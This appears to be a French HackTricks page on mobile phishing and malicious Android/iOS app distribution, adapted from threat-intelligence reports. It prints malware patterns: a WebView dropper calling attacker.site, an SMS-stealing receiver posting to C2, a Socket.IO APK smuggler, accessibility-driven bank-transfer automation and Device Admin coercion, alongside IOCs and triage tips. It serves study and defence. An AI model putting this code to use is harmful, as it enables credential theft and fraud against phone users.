# Phishing mobile & distribution d'applications malveillantes (Android & iOS)

{{#include ../../banners/hacktricks-training.md}}

> [!INFO]
> Cette page couvre les techniques utilisées par des acteurs menaçants pour distribuer des **Android APKs malveillants** et des **iOS mobile-configuration profiles** via le phishing (SEO, ingénierie sociale, fausses boutiques, apps de rencontres, etc.).
> Le matériel est adapté de la campagne SarangTrap exposée par Zimperium zLabs (2025) et d'autres recherches publiques.

## Flux d'attaque

1. **SEO/Phishing Infrastructure**
* Enregistrer des dizaines de domaines ressemblants (sites de rencontres, partage cloud, service automobile…).
– Utiliser des mots-clés en langue locale et des emojis dans l'élément `<title>` pour obtenir du classement dans Google.
– Héberger *à la fois* les instructions d'installation Android (`.apk`) et iOS sur la même landing page.
2. **Téléchargement de première étape**
* Android : lien direct vers un APK *non signé* ou issu d'un « third-party store ».
* iOS : `itms-services://` ou lien HTTPS simple vers un **mobileconfig** malveillant (voir ci‑dessous).
3. **Ingénierie sociale post-installation**
* Au premier lancement l'app demande un **code d'invitation / vérification** (illusion d'accès exclusif).
* Le code est **POSTed over HTTP** vers le Command-and-Control (C2).
* Le C2 répond `{"success":true}` ➜ le malware poursuit.
* Les analyses dynamiques Sandbox / AV qui ne soumettent jamais de code valide n'observent **aucun comportement malveillant** (évasion).
4. **Abus des permissions à l'exécution (Android)**
* Les permissions dangereuses ne sont demandées **qu'après une réponse positive du C2** :
```xml
<uses-permission android:name="android.permission.READ_CONTACTS"/>
<uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
<uses-permission android:name="android.permission.READ_PHONE_STATE"/>
<!-- Older builds also asked for SMS permissions -->
```
* Les variantes récentes **suppriment `<uses-permission>` pour SMS dans `AndroidManifest.xml`** mais laissent le chemin Java/Kotlin qui lit les SMS via reflection ⇒ réduit le score statique tout en restant fonctionnel sur des appareils où la permission est accordée via `AppOps` abuse ou des cibles anciennes.

5. **Android 13+ Restricted settings & Dropper Bypass (SecuriDropper‑style)**
* Android 13 a introduit les **Restricted settings** pour les apps sideloadées : les bascules Accessibility et Notification Listener sont grisées tant que l'utilisateur n'autorise pas explicitement les restricted settings dans **App info**.
* Les pages de phishing et les droppers fournissent maintenant des instructions UI étape‑par‑étape pour **autoriser les restricted settings** pour l'app sideloadée puis activer l'accès Accessibility/Notification.
* Un contournement plus récent consiste à installer la charge utile via un **session‑based PackageInstaller flow** (la même méthode que les stores utilisent). Android traite l'app comme installée depuis un store, donc Restricted settings ne bloque plus Accessibility.
* Indice de triage : dans un dropper, grep pour `PackageInstaller.createSession/openSession` plus du code qui navigue immédiatement la victime vers `ACTION_ACCESSIBILITY_SETTINGS` ou `ACTION_NOTIFICATION_LISTENER_SETTINGS`.

6. **UI de façade & collecte en arrière-plan**
* L'app affiche des vues inoffensives (visionneuse SMS, sélecteur de galerie) implémentées localement.
* En parallèle elle exfiltre :
- IMEI / IMSI, numéro de téléphone
- Dump complet de `ContactsContract` (tableau JSON)
- JPEG/PNG depuis `/sdcard/DCIM` compressés avec [Luban](https://github.com/Curzibn/Luban) pour réduire la taille
- Contenu SMS optionnel (`content://sms`)
Les payloads sont **batch-zippés** et envoyés via `HTTP POST /upload.php`.
7. **Technique de livraison iOS**
* Un seul **mobile-configuration profile** peut demander `PayloadType=com.apple.sharedlicenses`, `com.apple.managedConfiguration` etc. pour enrôler l'appareil dans une supervision de type “MDM”.
* Instructions d'ingénierie sociale :
1. Ouvrir Réglages ➜ *Profil téléchargé*.
2. Appuyer sur *Installer* trois fois (captures d'écran sur la page de phishing).
3. Faire confiance au profil non signé ➜ l'attaquant obtient les droits *Contacts* & *Photo* sans revue App Store.
8. **Payload iOS Web Clip (icône d'app de phishing)**
* Les payloads `com.apple.webClip.managed` peuvent **épingler une URL de phishing à l'écran d'accueil** avec une icône/libellé de marque.
* Les Web Clips peuvent s'exécuter en **plein écran** (cache l'UI du navigateur) et être marqués **non‑retirables**, forçant la victime à supprimer le profil pour retirer l'icône.
9. **Couche réseau**
* HTTP en clair, souvent sur le port 80 avec un header HOST comme `api.<phishingdomain>.com`.
* `User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ3A.230805.001)` (pas de TLS → facilement détectable).

## Conseils Red-Team

* **Dynamic Analysis Bypass** – Pendant l'évaluation du malware, automatiser la phase du code d'invitation avec Frida/Objection pour atteindre la branche malveillante.
* **Manifest vs. Runtime Diff** – Comparer `aapt dump permissions` avec le runtime `PackageManager#getRequestedPermissions()` ; l'absence de perms dangereuses est un signal d'alerte.
* **Network Canary** – Configurer `iptables -p tcp --dport 80 -j NFQUEUE` pour détecter des rafales POST suspectes après la saisie du code.
* **mobileconfig Inspection** – Utiliser `security cms -D -i profile.mobileconfig` sur macOS pour lister `PayloadContent` et repérer des entitlements excessifs.

## Extrait Frida utile : contournement automatique du code d'invitation

<details>
<summary>Frida : contournement automatique du code d'invitation</summary>
```javascript
// frida -U -f com.badapp.android -l bypass.js --no-pause
// Hook HttpURLConnection write to always return success
Java.perform(function() {
var URL = Java.use('java.net.URL');
URL.openConnection.implementation = function() {
var conn = this.openConnection();
var HttpURLConnection = Java.use('java.net.HttpURLConnection');
if (Java.cast(conn, HttpURLConnection)) {
conn.getResponseCode.implementation = function(){ return 200; };
conn.getInputStream.implementation = function(){
return Java.use('java.io.ByteArrayInputStream').$new("{\"success\":true}".getBytes());
};
}
return conn;
};
});
```
</details>

## Indicateurs (Génériques)
```
/req/checkCode.php        # invite code validation
/upload.php               # batched ZIP exfiltration
LubanCompress 1.1.8       # "Luban" string inside classes.dex
```
---

## Android WebView Payment Phishing (UPI) – Dropper + FCM C2 Pattern

This pattern has been observed in campaigns abusing government-benefit themes to steal Indian UPI credentials and OTPs. Operators chain reputable platforms for delivery and resilience.

### Delivery chain across trusted platforms
- YouTube video lure → description contains a short link
- Lien court → GitHub Pages phishing site imitating the legit portal
- Same GitHub repo hosts an APK with a fake “Google Play” badge linking directly to the file
- Des pages de phishing dynamiques hébergées sur Replit ; le canal de commande distant utilise Firebase Cloud Messaging (FCM)

### Dropper with embedded payload and offline install
- First APK is an installer (dropper) that ships the real malware at `assets/app.apk` and prompts the user to disable Wi‑Fi/mobile data to blunt cloud detection.
- The embedded payload installs under an innocuous label (e.g., “Secure Update”). After install, both the installer and the payload are present as separate apps.

Static triage tip (grep for embedded payloads):
```bash
unzip -l sample.apk | grep -i "assets/app.apk"
# Or:
zipgrep -i "classes|.apk" sample.apk | head
```
### Découverte dynamique d'endpoints via shortlink
- Malware récupère une liste en texte brut, séparée par des virgules, d'endpoints actifs depuis un shortlink ; de simples transformations de chaînes produisent le chemin final de la page de phishing.

Exemple (assaini) :
```
GET https://rebrand.ly/dclinkto2
Response: https://sqcepo.replit.app/gate.html,https://sqcepo.replit.app/addsm.php
Transform: "gate.html" → "gate.htm" (loaded in WebView)
UPI credential POST: https://sqcepo.replit.app/addup.php
SMS upload:           https://sqcepo.replit.app/addsm.php
```
Pseudo-code :
```java
String csv = httpGet(shortlink);
String[] parts = csv.split(",");
String upiPage = parts[0].replace("gate.html", "gate.htm");
String smsPost = parts[1];
String credsPost = upiPage.replace("gate.htm", "addup.php");
```
### Collecte d'identifiants UPI via WebView
- L'étape « Make payment of ₹1 / UPI‑Lite » charge un formulaire HTML malveillant depuis un endpoint dynamique à l'intérieur d'un WebView et capture des champs sensibles (téléphone, banque, UPI PIN) qui sont envoyés via `POST` à `addup.php`.

Loader minimal:
```java
WebView wv = findViewById(R.id.web);
wv.getSettings().setJavaScriptEnabled(true);
wv.loadUrl(upiPage); // ex: https://<replit-app>/gate.htm
```
### Self-propagation and SMS/OTP interception
- Des autorisations agressives sont demandées au premier lancement :
```xml
<uses-permission android:name="android.permission.READ_CONTACTS"/>
<uses-permission android:name="android.permission.SEND_SMS"/>
<uses-permission android:name="android.permission.READ_SMS"/>
<uses-permission android:name="android.permission.CALL_PHONE"/>
```
- Les contacts sont parcourus pour envoyer en masse des SMS de smishing depuis l'appareil de la victime.
- Les SMS entrants sont interceptés par un broadcast receiver et uploadés avec des métadonnées (expéditeur, contenu, slot SIM, ID aléatoire par appareil) vers `/addsm.php`.

Schéma du receiver :
```java
public void onReceive(Context c, Intent i){
SmsMessage[] msgs = Telephony.Sms.Intents.getMessagesFromIntent(i);
for (SmsMessage m: msgs){
postForm(urlAddSms, new FormBody.Builder()
.add("senderNum", m.getOriginatingAddress())
.add("Message", m.getMessageBody())
.add("Slot", String.valueOf(getSimSlot(i)))
.add("Device rand", getOrMakeDeviceRand(c))
.build());
}
}
```
### Firebase Cloud Messaging (FCM) comme un C2 résilient
- Le payload s'enregistre auprès de FCM ; les push messages transportent un champ `_type` utilisé comme commutateur pour déclencher des actions (par ex., mettre à jour des modèles de texte de phishing, activer/désactiver des comportements).

Exemple de payload FCM:
```json
{
"to": "<device_fcm_token>",
"data": {
"_type": "update_texts",
"template": "New subsidy message..."
}
}
```
Schéma du handler:
```java
@Override
public void onMessageReceived(RemoteMessage msg){
String t = msg.getData().get("_type");
switch (t){
case "update_texts": applyTemplate(msg.getData().get("template")); break;
case "smish": sendSmishToContacts(); break;
// ... more remote actions
}
}
```
### Indicateurs/IOCs
- APK contient un payload secondaire dans `assets/app.apk`
- WebView charge le paiement depuis `gate.htm` et exfiltre vers `/addup.php`
- Exfiltration SMS vers `/addsm.php`
- Récupération de config via shortlink (p.ex., `rebrand.ly/*`) renvoyant des endpoints CSV
- Applications étiquetées comme génériques “Update/Secure Update”
- Messages FCM `data` avec un discriminateur `_type` dans des apps non fiables

---

## Socket.IO/WebSocket-based APK Smuggling + Fake Google Play Pages

Les attaquants remplacent de plus en plus les liens APK statiques par un canal Socket.IO/WebSocket intégré dans des leurres imitant Google Play. Cela dissimule l'URL du payload, contourne les filtres URL/extension et préserve une UX d'installation réaliste.

Flux client typique observé sur le terrain:

<details>
<summary>Socket.IO fake Play downloader (JavaScript)</summary>
```javascript
// Open Socket.IO channel and request payload
const socket = io("wss://<lure-domain>/ws", { transports: ["websocket"] });
socket.emit("startDownload", { app: "com.example.app" });

// Accumulate binary chunks and drive fake Play progress UI
const chunks = [];
socket.on("chunk", (chunk) => chunks.push(chunk));
socket.on("downloadProgress", (p) => updateProgressBar(p));

// Assemble APK client‑side and trigger browser save dialog
socket.on("downloadComplete", () => {
const blob = new Blob(chunks, { type: "application/vnd.android.package-archive" });
const url = URL.createObjectURL(blob);
const a = document.createElement("a");
a.href = url; a.download = "app.apk"; a.style.display = "none";
document.body.appendChild(a); a.click();
});
```
</details>

Pourquoi il échappe à des contrôles simples :
- Aucune URL APK statique n'est exposée ; le payload est reconstruit en mémoire à partir des trames WebSocket.
- Les filtres URL/MIME/d'extension qui bloquent les réponses directes .apk peuvent ne pas détecter des données binaires tunnelisées via WebSockets/Socket.IO.
- Les crawlers et sandboxes d'URL qui n'exécutent pas WebSockets ne récupéreront pas le payload.

Voir aussi WebSocket tradecraft et tooling :

{{#ref}}
../../pentesting-web/websocket-attacks.md
{{#endref}}


## Android Accessibility/Overlay & Device Admin Abuse, automatisation ATS et orchestration de relais NFC – étude de cas RatOn

La campagne RatOn banker/RAT (ThreatFabric) est un exemple concret montrant comment les opérations modernes de phishing mobile mêlent des WebView droppers, Accessibility-driven UI automation, overlays/ransom, coercition Device Admin, Automated Transfer System (ATS), crypto wallet takeover, et même NFC-relay orchestration. Cette section abstrait les techniques réutilisables.

### Stage-1 : WebView → native install bridge (dropper)
Les attaquants présentent un WebView pointant vers une page malveillante et injectent une interface JavaScript qui expose un native installer. Un appui sur un bouton HTML appelle du code natif qui installe un APK de second stade inclus dans les assets du dropper, puis le lance directement.

Pattern minimal:

<details>
<summary>Pattern minimal du dropper Stage-1 (Java)</summary>
```java
public class DropperActivity extends Activity {
@Override protected void onCreate(Bundle b){
super.onCreate(b);
WebView wv = new WebView(this);
wv.getSettings().setJavaScriptEnabled(true);
wv.addJavascriptInterface(new Object(){
@android.webkit.JavascriptInterface
public void installApk(){
try {
PackageInstaller pi = getPackageManager().getPackageInstaller();
PackageInstaller.SessionParams p = new PackageInstaller.SessionParams(PackageInstaller.SessionParams.MODE_FULL_INSTALL);
int id = pi.createSession(p);
try (PackageInstaller.Session s = pi.openSession(id);
InputStream in = getAssets().open("payload.apk");
OutputStream out = s.openWrite("base.apk", 0, -1)){
byte[] buf = new byte[8192]; int r; while((r=in.read(buf))>0){ out.write(buf,0,r);} s.fsync(out);
}
PendingIntent status = PendingIntent.getBroadcast(this, 0, new Intent("com.evil.INSTALL_DONE"), PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
pi.commit(id, status.getIntentSender());
} catch (Exception e) { /* log */ }
}
}, "bridge");
setContentView(wv);
wv.loadUrl("https://attacker.site/install.html");
}
}
```
</details>

HTML sur la page:
```html
<button onclick="bridge.installApk()">Install</button>
```
Après l'installation, le dropper lance le payload via un package/activity explicite :
```java
Intent i = new Intent();
i.setClassName("com.stage2.core", "com.stage2.core.MainActivity");
startActivity(i);
```
Idée de chasse : applications non fiables appelant `addJavascriptInterface()` et exposant des méthodes de type installateur au WebView ; APK embarquant un payload secondaire sous `assets/` et invoquant le Package Installer Session API.

### Entonnoir de consentement : Accessibility + Device Admin + follow-on runtime prompts
Stage-2 ouvre un WebView qui héberge une page “Access”. Son bouton invoque une méthode exportée qui dirige la victime vers les paramètres Accessibility et demande l'activation du service malveillant. Une fois accordé, le malware utilise Accessibility pour cliquer automatiquement à travers les dialogues de permission runtime subséquents (contacts, overlay, gestion des paramètres système, etc.) et demande Device Admin.

- Accessibility aide, de manière programmatique, à accepter les invites ultérieures en trouvant des boutons comme “Allow”/“OK” dans l'arbre de nœuds et en simulant des clics.
- Vérification/demande de permission Overlay :
```java
if (!Settings.canDrawOverlays(ctx)) {
Intent i = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
Uri.parse("package:" + ctx.getPackageName()));
ctx.startActivity(i);
}
```
Voir aussi :

{{#ref}}
../../mobile-pentesting/android-app-pentesting/accessibility-services-abuse.md
{{#endref}}

### Overlay phishing/ransom via WebView
Les opérateurs peuvent émettre des commandes pour :
- afficher une overlay plein écran depuis une URL, ou
- transmettre du HTML inline qui est chargé dans une overlay WebView.

Utilisations probables : coercition (saisie du PIN), ouverture de wallet pour capturer les PINs, ransom messaging. Prévoir une commande pour vérifier/obtenir l'autorisation d'overlay si elle manque.

### Remote control model – text pseudo-screen + screen-cast
- Basse bande passante : dumper périodiquement l'Accessibility node tree, sérialiser les textes/roles/bounds visibles et envoyer au C2 comme un pseudo-écran (commandes comme `txt_screen` une fois et `screen_live` en continu).
- Haute fidélité : demander MediaProjection et démarrer le screen-casting/enregistrement à la demande (commandes comme `display` / `record`).

### ATS playbook (bank app automation)
Étant donné une tâche JSON, ouvrir l'application bancaire, piloter l'UI via Accessibility avec un mélange de requêtes textuelles et de taps par coordonnées, et saisir le PIN de paiement de la victime lorsqu'il est demandé.

Exemple de tâche :
```json
{
"cmd": "transfer",
"receiver_address": "ACME s.r.o.",
"account": "123456789/0100",
"amount": "24500.00",
"name": "ACME"
}
```
Exemples de textes vus dans un flux cible (CZ → EN) :
- "Nová platba" → "Nouveau paiement"
- "Zadat platbu" → "Saisir le paiement"
- "Nový příjemce" → "Nouveau bénéficiaire"
- "Domácí číslo účtu" → "Numéro de compte national"
- "Další" → "Suivant"
- "Odeslat" → "Envoyer"
- "Ano, pokračovat" → "Oui, continuer"
- "Zaplatit" → "Payer"
- "Hotovo" → "Terminé"

Les opérateurs peuvent également vérifier/augmenter les limites de virement via des commandes comme `check_limit` et `limit` qui naviguent de la même manière dans l'interface des limites.

### Crypto wallet seed extraction
Cibles comme MetaMask, Trust Wallet, Blockchain.com, Phantom. Flux : déverrouiller (PIN volé ou mot de passe fourni), naviguer vers Security/Recovery, révéler/afficher la seed phrase, keylog/exfiltrate it. Implémenter des sélecteurs sensibles à la locale (EN/RU/CZ/SK) pour stabiliser la navigation entre les langues.

### Device Admin coercion
Les Device Admin APIs sont utilisées pour augmenter les opportunités de capture du PIN et contrarier la victime :

- Verrouillage immédiat :
```java
dpm.lockNow();
```
- Expirer l'identifiant actuel pour forcer le changement (Accessibilité capture le nouveau PIN/mot de passe) :
```java
dpm.setPasswordExpirationTimeout(admin, 1L); // requires admin / often owner
```
- Forcer le déverrouillage non biométrique en désactivant les fonctionnalités biométriques de keyguard :
```java
dpm.setKeyguardDisabledFeatures(admin,
DevicePolicyManager.KEYGUARD_DISABLE_FINGERPRINT |
DevicePolicyManager.KEYGUARD_DISABLE_TRUST_AGENTS);
```
Note : De nombreux contrôles DevicePolicyManager nécessitent Device Owner/Profile Owner sur les versions récentes d'Android ; certaines builds OEM peuvent être laxistes. Validez toujours sur l'OS/OEM cible.

### NFC relay orchestration (NFSkate)
Stage-3 peut installer et lancer un module de relais NFC externe (par ex., NFSkate) et lui fournir un template HTML pour guider la victime pendant le relais. Cela permet un cash-out sans contact avec carte présente en parallèle d'ATS en ligne.

Background: [NFSkate NFC relay](https://www.threatfabric.com/blogs/ghost-tap-new-cash-out-tactic-with-nfc-relay).

### Operator command set (sample)
- UI/state: `txt_screen`, `screen_live`, `display`, `record`
- Social: `send_push`, `Facebook`, `WhatsApp`
- Overlays: `overlay` (inline HTML), `block` (URL), `block_off`, `access_tint`
- Wallets: `metamask`, `trust`, `blockchain`, `phantom`
- ATS: `transfer`, `check_limit`, `limit`
- Device: `lock`, `expire_password`, `disable_keyguard`, `home`, `back`, `recents`, `power`, `touch`, `swipe`, `keypad`, `tint`, `sound_mode`, `set_sound`
- Comms/Recon: `update_device`, `send_sms`, `replace_buffer`, `get_name`, `add_contact`
- NFC: `nfs`, `nfs_inject`

### Accessibility-driven ATS anti-detection: human-like text cadence and dual text injection (Herodotus)

Les acteurs de menace mélangent de plus en plus l'automatisation pilotée par Accessibility avec des techniques anti-détection adaptées aux biométries comportementales de base. Un banker/RAT récent présente deux modes complémentaires de livraison de texte et un bascule opérateur pour simuler la saisie humaine avec une cadence randomisée.

- Discovery mode : énumérer les nœuds visibles avec des sélecteurs et des bounds pour cibler précisément les entrées (ID, text, contentDescription, hint, bounds) avant d'agir.
- Dual text injection :
- Mode 1 – `ACTION_SET_TEXT` directement sur le nœud cible (stable, sans clavier) ;
- Mode 2 – clipboard set + `ACTION_PASTE` dans le nœud focalisé (fonctionne lorsque setText direct est bloqué).
- Human-like cadence : découper la chaîne fournie par l'opérateur et la transmettre caractère par caractère avec des délais aléatoires de 300–3000 ms entre les événements pour échapper aux heuristiques de "machine-speed typing". Implémenté soit en faisant croître progressivement la valeur via `ACTION_SET_TEXT`, soit en collant un caractère à la fois.

<details>
<summary>Exemple Java : découverte de nœuds + saisie différée caractère par caractère via setText ou clipboard+paste</summary>
```java
// Enumerate nodes (HVNCA11Y-like): text, id, desc, hint, bounds
void discover(AccessibilityNodeInfo r, List<String> out){
if (r==null) return; Rect b=new Rect(); r.getBoundsInScreen(b);
CharSequence id=r.getViewIdResourceName(), txt=r.getText(), cd=r.getContentDescription();
out.add(String.format("cls=%s id=%s txt=%s desc=%s b=%s",
r.getClassName(), id, txt, cd, b.toShortString()));
for(int i=0;i<r.getChildCount();i++) discover(r.getChild(i), out);
}

// Mode 1: progressively set text with randomized 300–3000 ms delays
void sendTextSetText(AccessibilityNodeInfo field, String s) throws InterruptedException{
String cur = "";
for (char c: s.toCharArray()){
cur += c; Bundle b=new Bundle();
b.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, cur);
field.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, b);
Thread.sleep(300 + new java.util.Random().nextInt(2701));
}
}

// Mode 2: clipboard + paste per-char with randomized delays
void sendTextPaste(AccessibilityService svc, AccessibilityNodeInfo field, String s) throws InterruptedException{
field.performAction(AccessibilityNodeInfo.ACTION_FOCUS);
ClipboardManager cm=(ClipboardManager) svc.getSystemService(Context.CLIPBOARD_SERVICE);
for (char c: s.toCharArray()){
cm.setPrimaryClip(ClipData.newPlainText("x", Character.toString(c)));
field.performAction(AccessibilityNodeInfo.ACTION_PASTE);
Thread.sleep(300 + new java.util.Random().nextInt(2701));
}
}
```
</details>

Overlays bloquants pour masquer la fraude :
- Rendre un `TYPE_ACCESSIBILITY_OVERLAY` plein écran avec une opacité contrôlée par l'opérateur ; le maintenir opaque pour la victime pendant que l'automatisation distante se déroule en dessous.
- Commandes généralement exposées : `opacityOverlay <0..255>`, `sendOverlayLoading <html/url>`, `removeOverlay`.

Overlay minimal avec alpha ajustable :
```java
View v = makeOverlayView(ctx); v.setAlpha(0.92f); // 0..1
WindowManager.LayoutParams lp = new WindowManager.LayoutParams(
MATCH_PARENT, MATCH_PARENT,
WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL,
PixelFormat.TRANSLUCENT);
wm.addView(v, lp);
```
Primitives de contrôle opérateur fréquemment observées : `BACK`, `HOME`, `RECENTS`, `CLICKTXT`/`CLICKDESC`/`CLICKELEMENT`/`CLICKHINT`, `TAP`/`SWIPE`, `NOTIFICATIONS`, `OPNPKG`, `VNC`/`VNCA11Y` (partage d'écran).

## Références

- [New Android Malware Herodotus Mimics Human Behaviour to Evade Detection](https://www.threatfabric.com/blogs/new-android-malware-herodotus-mimics-human-behaviour-to-evade-detection)

- [The Dark Side of Romance: SarangTrap Extortion Campaign](https://zimperium.com/blog/the-dark-side-of-romance-sarangtrap-extortion-campaign)
- [Luban – Android image compression library](https://github.com/Curzibn/Luban)
- [Android Malware Promises Energy Subsidy to Steal Financial Data (McAfee Labs)](https://www.mcafee.com/blogs/other-blogs/mcafee-labs/android-malware-promises-energy-subsidy-to-steal-financial-data/)
- [Firebase Cloud Messaging — Docs](https://firebase.google.com/docs/cloud-messaging)
- [The Rise of RatOn: From NFC heists to remote control and ATS (ThreatFabric)](https://www.threatfabric.com/blogs/the-rise-of-raton-from-nfc-heists-to-remote-control-and-ats)
- [GhostTap/NFSkate – NFC relay cash-out tactic (ThreatFabric)](https://www.threatfabric.com/blogs/ghost-tap-new-cash-out-tactic-with-nfc-relay)
- [Banker Trojan Targeting Indonesian and Vietnamese Android Users (DomainTools)](https://dti.domaintools.com/banker-trojan-targeting-indonesian-and-vietnamese-android-users/)
- [DomainTools SecuritySnacks – ID/VN Banker Trojans (IOCs)](https://github.com/DomainTools/SecuritySnacks/blob/main/2025/BankerTrojan-ID-VN)
- [Socket.IO](https://socket.io)
- [Bypassing Android 13 Restrictions with SecuriDropper (ThreatFabric)](https://www.threatfabric.com/blogs/droppers-bypassing-android-13-restrictions)
- [Web Clips payload settings for Apple devices](https://support.apple.com/guide/deployment/web-clips-payload-settings-depbc7c7808/web)

{{#include ../../banners/hacktricks-training.md}}
